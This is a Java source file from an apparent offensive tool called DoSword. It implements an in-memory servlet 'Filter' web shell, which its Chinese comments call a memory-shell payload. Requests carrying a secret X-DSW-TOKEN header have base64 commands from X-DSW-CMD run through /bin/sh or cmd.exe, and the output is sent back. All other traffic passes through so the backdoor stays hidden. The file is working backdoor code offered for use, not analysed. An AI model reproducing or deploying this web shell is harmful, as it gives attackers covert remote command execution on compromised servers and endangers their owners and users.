package dsw;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Base64;

/**
 * DoSword Java Filter 内存马载荷。
 *
 * 设计约束（与 DoSword 的内存马准入一致）：
 * - 只认 X-DSW-TOKEN 头，逐字符异或比较（防时序/前缀泄露）；
 * - 不匹配时**必须** chain.doFilter 放行，避免目标站点被自己的驻留代码打挂；
 * - 命令走 X-DSW-CMD（base64），只做 exec 与 ping，不做文件落地；
 * - 卸载由宿主删除 FilterDef/FilterMap 完成，载荷本身不持久化任何东西。
 *
 * 该文件由 `cargo test` 的 javac 门控用例重新编译并与内嵌字节码比对，
 * 保证「源码改了但字节码没重新生成」不可能被带进发布。
 */
public class TokenFilter implements Filter {

    /** 由注册时写入 FilterDef 的 init-param 提供。 */
    private String expectedToken;

    @Override
    public void init(FilterConfig config) {
        this.expectedToken = config == null ? null : config.getInitParameter("token");
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        if (!(request instanceof HttpServletRequest) || !(response instanceof HttpServletResponse)) {
            chain.doFilter(request, response);
            return;
        }
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        String provided = httpRequest.getHeader("X-DSW-TOKEN");
        if (expectedToken == null || provided == null || !matches(expectedToken, provided)) {
            // 令牌不符一律放行：宁可少一个功能，也不能影响目标业务
            chain.doFilter(request, response);
            return;
        }
        String op = httpRequest.getHeader("X-DSW-OP");
        if (op == null) {
            op = "ping";
        }
        httpResponse.setHeader("Cache-Control", "no-store");
        PrintWriter writer = httpResponse.getWriter();
        if ("ping".equals(op)) {
            writer.print("{\"ok\":true,\"filter\":\"" + expectedToken.length() + "\"}");
            return;
        }
        if (!"exec".equals(op)) {
            httpResponse.setStatus(400);
            writer.print("{\"ok\":false,\"error\":\"op\"}");
            return;
        }
        String encoded = httpRequest.getHeader("X-DSW-CMD");
        if (encoded == null || encoded.isEmpty()) {
            httpResponse.setStatus(400);
            writer.print("{\"ok\":false,\"error\":\"cmd\"}");
            return;
        }
        String command;
        try {
            command = new String(Base64.getDecoder().decode(encoded), "UTF-8");
        } catch (IllegalArgumentException error) {
            httpResponse.setStatus(400);
            writer.print("{\"ok\":false,\"error\":\"base64\"}");
            return;
        }
        String output = exec(command);
        httpResponse.setContentType("application/json;charset=UTF-8");
        writer.print("{\"ok\":true,\"output\":\"" + escape(output) + "\"}");
    }

    @Override
    public void destroy() {
        this.expectedToken = null;
    }

    /** 逐字符异或累加：长度不同也走完整循环，不提前返回。 */
    private static boolean matches(String expected, String provided) {
        int diff = expected.length() ^ provided.length();
        int length = Math.min(expected.length(), provided.length());
        for (int index = 0; index < length; index++) {
            diff |= expected.charAt(index) ^ provided.charAt(index);
        }
        return diff == 0;
    }

    private static String exec(String command) {
        StringBuilder builder = new StringBuilder();
        try {
            String shell = isWindows() ? "cmd.exe" : "/bin/sh";
            String flag = isWindows() ? "/c" : "-c";
            Process process = new ProcessBuilder(shell, flag, command)
                    .redirectErrorStream(true)
                    .start();
            byte[] buffer = new byte[4096];
            int read;
            while ((read = process.getInputStream().read(buffer)) > 0) {
                builder.append(new String(buffer, 0, read, "UTF-8"));
            }
            process.waitFor();
        } catch (Exception error) {
            builder.append("exec failed: ").append(error.getClass().getName());
        }
        return builder.toString();
    }

    private static boolean isWindows() {
        String os = System.getProperty("os.name");
        return os != null && os.toLowerCase().contains("win");
    }

    private static String escape(String value) {
        StringBuilder builder = new StringBuilder(value.length() + 16);
        for (int index = 0; index < value.length(); index++) {
            char ch = value.charAt(index);
            switch (ch) {
                case '"':
                    builder.append("\\\"");
                    break;
                case '\\':
                    builder.append("\\\\");
                    break;
                case '\n':
                    builder.append("\\n");
                    break;
                case '\r':
                    builder.append("\\r");
                    break;
                case '\t':
                    builder.append("\\t");
                    break;
                default:
                    builder.append(ch);
            }
        }
        return builder.toString();
    }
}
